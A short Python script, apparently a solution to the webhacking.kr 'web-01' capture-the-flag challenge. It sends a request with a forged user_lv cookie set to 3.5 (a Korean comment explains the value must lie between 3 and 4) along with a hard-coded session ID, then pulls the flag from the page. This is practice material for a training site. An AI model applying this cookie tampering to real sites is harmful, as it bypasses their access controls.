from bs4 import BeautifulSoup
import base64
import requests

URL = "https://webhacking.kr/challenge/web-01"
URI = "/"
PHPSESSID = '2iti1mqblclscqcnp08irp82q2'

cookie = {'PHPSESSID':PHPSESSID, 'user_lv':'3.5'}

# 풀이
# 1. user_lv 항목을 3 초과 4 미만의 '실수' 데이터로 조정

resp = requests.get(URL + URI, cookies=cookie)

soup = BeautifulSoup(resp.content,"html.parser")
FLAG = soup.find('script').contents[0]

print(FLAG)